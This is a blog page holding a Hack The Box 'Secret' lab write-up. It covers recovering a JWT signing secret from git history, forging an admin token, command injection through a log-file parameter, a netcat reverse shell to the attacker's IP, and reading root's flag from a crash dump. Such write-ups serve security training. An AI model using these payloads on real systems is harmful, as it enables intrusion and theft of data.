<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Secret | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Secret - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-02-htb-secret-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-02-htb-secret-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Secret"><meta property="og:description" content="HTB - Secret - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-02-htb-secret-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-02T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-02T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Secret"><meta name=twitter:description content="HTB - Secret - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Secret","item":"https://cadil.github.io/posts/2024-03-02-htb-secret-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Secret","name":"HTB - Secret","description":"HTB - Secret - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.120 # Local Address 10.10.14.140 2. Nmap \u0026 Nikto 2.1 Nmap nmap -sV -sC -oA nmap/secret 10.10.11.120 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-18 01:24 EST Nmap scan report for 10.10.11.120 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds nmap -vvv -p 22,80,3000 -A -v -sC -sV -oN intial.nmap 10.10.11.120 2.2 Nikto nikto -h 10.10.11.120 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.11.120 + Target Hostname: 10.10.11.120 + Target Port: 80 + Start Time: 2022-02-18 01:25:46 (GMT-5) --------------------------------------------------------------------------- + Server: nginx/1.18.0 (Ubuntu) + Retrieved x-powered-by header: Express + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use '-C all' to force check all possible dirs) 3. Source Code Download —Ö—ç—Å—ç–≥—Ç files.zip:\ntotal 84 drwxrwxr-x 1 ca4mi ca4mi 182 Sep 3 01:57 . drwxr-xr-x 1 ca4mi ca4mi 36 Feb 18 01:29 .. -rw-rw-r-- 1 ca4mi ca4mi 72 Sep 3 01:59 .env drwxrwxr-x 1 ca4mi ca4mi 144 Sep 8 14:33 .git -rw-rw-r-- 1 ca4mi ca4mi 885 Sep 3 01:56 index.js drwxrwxr-x 1 ca4mi ca4mi 14 Aug 13 2021 model drwxrwxr-x 1 ca4mi ca4mi 4158 Aug 13 2021 node_modules -rw-rw-r-- 1 ca4mi ca4mi 491 Aug 13 2021 package.json -rw-rw-r-- 1 ca4mi ca4mi 69452 Aug 13 2021 package-lock.json drwxrwxr-x 1 ca4mi ca4mi 20 Sep 3 01:54 public drwxrwxr-x 1 ca4mi ca4mi 80 Sep 3 02:32 routes drwxrwxr-x 1 ca4mi ca4mi 22 Aug 13 2021 src -rw-rw-r-- 1 ca4mi ca4mi 651 Aug 13 2021 validations.js .env:\nDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' TOKEN_SECRET = secret Gittools .git:\nmkdir dump bash /opt/tools/Extractor/extractor.sh local-web/ dump curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{\"foo\": \"bar\"}' Note: Unnecessary use of -X or --request, POST is already inferred. * Trying 10.10.11.120:80... * Connected to secret.htb (10.10.11.120) port 80 (#0) \u003e POST /api/user/register HTTP/1.1 \u003e Host: secret.htb \u003e User-Agent: curl/7.74.0 \u003e Accept: */* \u003e Content-Type: application/json \u003e Content-Length: 14 \u003e * upload completely sent off: 14 out of 14 bytes * Mark bundle as not supporting multiuse \u003c HTTP/1.1 400 Bad Request \u003c Server: nginx/1.18.0 (Ubuntu) \u003c Date: Fri, 18 Feb 2022 07:54:16 GMT \u003c Content-Type: text/html; charset=utf-8 \u003c Content-Length: 18 \u003c Connection: keep-alive \u003c X-Powered-By: Express \u003c ETag: W/\"12-FCVaNPnXYf0hIGYsTUTYByRq5/U\" \u003c * Connection #0 to host secret.htb left intact \"name\" is required \"name\" is required OK\nvalidation.js:\nconst Joi = require('@hapi/joi') // register validation const registerValidation = data =\u003e{ const schema = { name: Joi.string().min(6).required(), email: Joi.string().min(6).required().email(), password: Joi.string().min(6).required() }; return Joi.validate(data, schema) } // login validation const loginValidation = data =\u003e { const schema2 = { email: Joi.string().min(6).required().email(), password: Joi.string().min(6).required() }; return Joi.validate(data, schema2) } module.exports.registerValidation = registerValidation module.exports.loginValidation = loginValidation auth.js:\n// create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header('auth-token', token).send(token); TOKEN_SECRET?\n.env:\nDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' TOKEN_SECRET = secret dump:\ndrwxr-xr-x 1 ca4mi ca4mi 204 Feb 18 02:50 0-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 drwxr-xr-x 1 ca4mi ca4mi 220 Feb 18 02:51 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8 drwxr-xr-x 1 ca4mi ca4mi 204 Feb 18 02:53 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b drwxr-xr-x 1 ca4mi ca4mi 204 Feb 18 02:54 3-de0a46b5107a2f4d26e348303e76d85ae4870934 drwxr-xr-x 1 ca4mi ca4mi 220 Feb 18 02:56 4-3a367e735ee76569664bf7754eaaade7c735d702 drwxr-xr-x 1 ca4mi ca4mi 204 Feb 18 02:57 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb /dump/1-55fe756a29268f9b4e786ae468952ca4a8df1bd8:\nDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE verifytoken.js:\nconst jwt = require(\"jsonwebtoken\"); module.exports = function (req, res, next) { const token = req.header(\"auth-token\"); if (!token) return res.status(401).send(\"Access Denied\"); try { const verified = jwt.verify(token, process.env.TOKEN_SECRET); req.user = verified; next(); } catch (err) { res.status(400).send(\"Invalid Token\"); } }; 4. Register User Create User:\ncurl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{\"name\": \"ttttyly\",\"email\":\"ttttyly@ttttyly.com\",\"password\":\"ttttyly\"}' Login:\ncurl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/login --data '{\"email\":\"ttttyly@ttttyly.com\",\"password\":\"ttttyly\"}' Note: Unnecessary use of -X or --request, POST is already inferred. * Trying 10.10.11.120:80... * Connected to secret.htb (10.10.11.120) port 80 (#0) \u003e POST /api/user/login HTTP/1.1 \u003e Host: secret.htb \u003e User-Agent: curl/7.74.0 \u003e Accept: */* \u003e Content-Type: application/json \u003e Content-Length: 52 \u003e * upload completely sent off: 52 out of 52 bytes * Mark bundle as not supporting multiuse \u003c HTTP/1.1 200 OK \u003c Server: nginx/1.18.0 (Ubuntu) \u003c Date: Sun, 20 Feb 2022 05:02:35 GMT \u003c Content-Type: text/html; charset=utf-8 \u003c Content-Length: 212 \u003c Connection: keep-alive \u003c X-Powered-By: Express \u003c auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 \u003c ETag: W/\"d4-oM8BhVITzPnt1fTP3GjDWP1r3pE\" \u003c * Connection #0 to host secret.htb left intact eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 –ù—ç–≤—Ç—Ä—ç–Ω –æ—Ä—Å–æ–Ω\ncurl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 \u003c ETag: W/\"d4-oM8BhVITzPnt1fTP3GjDWP1r3pE' {\"role\":{\"role\":\"you are normal user\",\"desc\":\"ttttyly\"}} JWT Token —Ö”©—Ä–≤“Ø“Ø–ª—ç—Ö: https://github.com/ticarpi/jwt_tool\ntar xvzf jwt_tool-2.2.5.tar.gz python3 -m pip install termcolor cprint pycryptodomex requests python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 \u003c ETag: W/\"d4-oM8BhVITzPnt1fTP3GjDWP1r3pE ===================== Decoded Token Values: ===================== Token header values: [+] alg = \"HS256\" [+] typ = \"JWT\" Token payload values: [+] _id = \"6211cb53b289b4045a91baa4\" [+] name = \"ttttyly\" [+] email = \"ttttyly@ttttyly.com\" [+] iat = 1645333355 ==\u003e TIMESTAMP = 2022-02-20 00:02:35 (UTC) ---------------------- JWT common timestamps: iat = IssuedAt exp = Expires nbf = NotBefore ---------------------- Source -—Å –æ–ª–¥—Å–æ–Ω key –Ω—ç–º—ç—Ö:\npython3 jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 \u003c ETag: W/\"d4-oM8BhVITzPnt1fTP3GjDWP1r3pE –ù—ç–º—Å—ç–Ω token:\nOriginal JWT: jwttool_cbf8204ec14c30927f8819921cb0c4ec - Tampered token - HMAC Signing: [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M Admin —ç—Å—ç—Ö —à–∞–ª–≥–∞—Ö:\ncurl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M' {\"creds\":{\"role\":\"admin\",\"username\":\"theadmin\",\"desc\":\"welcome back admin\"}} Admin –º”©–Ω –±–∞–π—Å–∞–Ω. passwd log?file= –∞—à–∏–≥–ª–∞–Ω —à–∞–ª–≥–∞—Ö:\ncurl 'http://secret.htb/api/logs?file=/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M' {\"killed\":false,\"code\":128,\"signal\":null,\"cmd\":\"git log --oneline /etc/passwd\"}‚îå 5. Exploitation curl 'http://secret.htb/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M' \"80bf34c fixed typos üéâ\\n0c75212 now we can view logs from server üòÉ\\nab3e953 Added the codes\\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n\" dasith\ncurl via RCE payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.10 9001 \u003e/tmp/f CyperChef URL Encoded:\nrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E10%209001%20%3E%2Ftmp%2Ff 5.1 Reverse Shell nc -lvnp 9001 curl 'http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E10%209001%20%3E%2Ftmp%2Ff' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBmNTZlMGFlMGM5NzA0NWU3MGQwMTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUxNzI2OTR9.9atPnYQ9Vorv3rT4p54ngJiypMXVQXayPLOOppuxA2o' 5.2 Shell balance python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ctrl+z\nstty raw -echo f+g [enter enter] –±—É—Ü–∞–∞–¥ nc –æ—Ä–ª–æ–æ\nexport TERM=xterm 5.3 user.txt id:\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith) user.txt:\n762a20********** 5.4 linpeas.sh` /tmp /tmp/crash-report /tmp/crash-report/Architecture /tmp/crash-report/CoreDump /tmp/crash-report/CoreDump/Architecture /tmp/crash-report/CoreDump/CoreDump /tmp/crash-report/CoreDump/Date /tmp/crash-report/CoreDump/DistroRelease /tmp/crash-report/CoreDump/ExecutablePath #)You_can_write_even_more_files_inside_last_directory /tmp/crash-report/CrashCounter /tmp/crash-report/Date /tmp/crash-report/DistroRelease /tmp/crash-report/ExecutablePath /tmp/crash-report/ExecutableTimestamp #)You_can_write_even_more_files_inside_last_directory 6. Enumeration find / -type f -perm -u=s 2\u003e/dev/null cd /opt Out:\ndrwxr-xr-x 2 root root 4096 Oct 7 10:06 . drwxr-xr-x 20 root root 4096 Oct 7 15:01 .. -rw-r--r-- 1 root root 3736 Oct 7 10:01 code.c -rw-r--r-- 1 root root 16384 Oct 7 10:01 .code.c.swp -rwsr-xr-x 1 root root 17824 Oct 7 10:03 count -rw-r--r-- 1 root root 4622 Oct 7 10:04 valgrind.log count, code.c\nssh keygen local –¥—ç—ç—Ä “Ø“Ø—Å–≥—ç–Ω—ç:\nssh-keygen -t rsa -b 4096 -C 'drt@htb' -f secret.htb -P '' secret.hub.pub\nssh-rsa AAAAB3NzaC1yc2EAAAA********************xiPOw== ca@htb —Ö—É—É–ª–∞—Ö auth_key (machine vm)\nssh -i secret.htb dasith@10.10.11.120 —Ö–æ—ë—Ä ssh –Ω—ç—ç–Ω—ç\nssh 1:\ndasith@secret:/opt$ ./count -p Enter source file/directory name: /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 Save results a file? [y/N]: y Path: ssh 2:\ndasith@secret:/opt$ ps -aux | grep count root 824 0.0 0.1 235676 7472 ? Ssl Feb19 0:01 /usr/lib/accountsservice/accounts-daemon dasith 3417 0.0 0.0 2488 576 pts/2 S+ Feb19 0:00 ./count dasith 4596 0.0 0.0 2488 588 pts/4 S+ 05:28 0:00 ./count -p dasith 4606 0.0 0.0 6432 736 pts/5 S+ 05:28 0:00 grep --color=auto count kill -BUS 4596 tmp –¥–æ—Ç–æ—Ä caca –Ω—ç—Ä—Ç—ç–π —Ñ–æ–ª–¥–µ—Ä “Ø“Ø—Å–≥—ç—ç–¥ –¥–æ—Ç–æ—Ä –Ω—å unpack —Ö–∏–π–Ω—ç:\napport-unpack _opt_count.1000.crash /tmp/caca dasith@secret:/tmp/caca$ ls -la total 444 drwxrwxr-x 2 dasith dasith 4096 Feb 20 05:32 . drwxrwxrwt 15 root root 4096 Feb 20 05:32 .. -rw-rw-r-- 1 dasith dasith 5 Feb 20 05:32 Architecture -rw-rw-r-- 1 dasith dasith 380928 Feb 20 05:32 CoreDump -rw-rw-r-- 1 dasith dasith 1 Feb 20 05:32 CrashCounter -rw-rw-r-- 1 dasith dasith 24 Feb 20 05:32 Date -rw-rw-r-- 1 dasith dasith 12 Feb 20 05:32 DistroRelease -rw-rw-r-- 1 dasith dasith 10 Feb 20 05:32 ExecutablePath -rw-rw-r-- 1 dasith dasith 10 Feb 20 05:32 ExecutableTimestamp -rw-rw-r-- 1 dasith dasith 2 Feb 20 05:32 _LogindSession -rw-rw-r-- 1 dasith dasith 5 Feb 20 05:32 ProblemType -rw-rw-r-- 1 dasith dasith 7 Feb 20 05:32 ProcCmdline -rw-rw-r-- 1 dasith dasith 4 Feb 20 05:32 ProcCwd -rw-rw-r-- 1 dasith dasith 97 Feb 20 05:32 ProcEnviron -rw-rw-r-- 1 dasith dasith 2144 Feb 20 05:32 ProcMaps -rw-rw-r-- 1 dasith dasith 1335 Feb 20 05:32 ProcStatus -rw-rw-r-- 1 dasith dasith 2 Feb 20 05:32 Signal -rw-rw-r-- 1 dasith dasith 29 Feb 20 05:32 Uname -rw-rw-r-- 1 dasith dasith 3 Feb 20 05:32 UserGroups strings CoreDump Root.txt\n8599fb********* ","wordCount":"1449","inLanguage":"mn","datePublished":"2024-03-02T00:00:00Z","dateModified":"2024-03-02T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-02-htb-secret-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cadil.github.io/bookmark/ title=Bookmark><span>Bookmark</span></a></li><li><a href=https://cadil.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>–ù“Ø“Ø—Ä</a>&nbsp;¬ª&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Secret</h1><div class=post-description>HTB - Secret - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-02 00:00:00 +0000 UTC'>–≥—É—Ä–∞–≤–¥—É–≥–∞–∞—Ä —Å–∞—Ä 2, 2024</span>&nbsp;¬∑&nbsp;7 –ú–ò–ù&nbsp;¬∑&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>–ê–≥—É—É–ª–≥–∞</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap--nikto aria-label="2. Nmap & Nikto">2. Nmap & Nikto</a><ul><li><a href=#21-nmap aria-label="2.1 Nmap">2.1 Nmap</a></li><li><a href=#22-nikto aria-label="2.2 Nikto">2.2 Nikto</a></li></ul></li><li><a href=#3-source-code aria-label="3. Source Code">3. Source Code</a></li><li><a href=#4-register-user aria-label="4. Register User">4. Register User</a></li><li><a href=#5-exploitation aria-label="5. Exploitation">5. Exploitation</a><ul><li><a href=#51-reverse-shell aria-label="5.1 Reverse Shell">5.1 Reverse Shell</a></li><li><a href=#52-shell-balance aria-label="5.2 Shell balance">5.2 Shell balance</a></li><li><a href=#53-usertxt aria-label="5.3 user.txt">5.3 user.txt</a></li><li><a href=#54-linpeassh aria-label="5.4 linpeas.sh`">5.4 linpeas.sh`</a></li></ul></li><li><a href=#6-enumeration aria-label="6. Enumeration">6. Enumeration</a></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.120
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
</span></span><span style=display:flex><span>10.10.14.140
</span></span></code></pre></div><h3 id=2-nmap--nikto>2. Nmap & Nikto<a hidden class=anchor aria-hidden=true href=#2-nmap--nikto>#</a></h3><h4 id=21-nmap>2.1 Nmap<a hidden class=anchor aria-hidden=true href=#21-nmap>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/secret 10.10.11.120
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-02-18 01:24 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.120
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> closed ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    nginx 1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: DUMB Docs
</span></span><span style=display:flex><span>3000/tcp open  http    Node.js <span style=color:#f92672>(</span>Express middleware<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: DUMB Docs
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 42.31 seconds
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -vvv -p 22,80,3000 -A -v -sC -sV -oN intial.nmap 10.10.11.120
</span></span></code></pre></div><h4 id=22-nikto>2.2 Nikto<a hidden class=anchor aria-hidden=true href=#22-nikto>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nikto -h 10.10.11.120
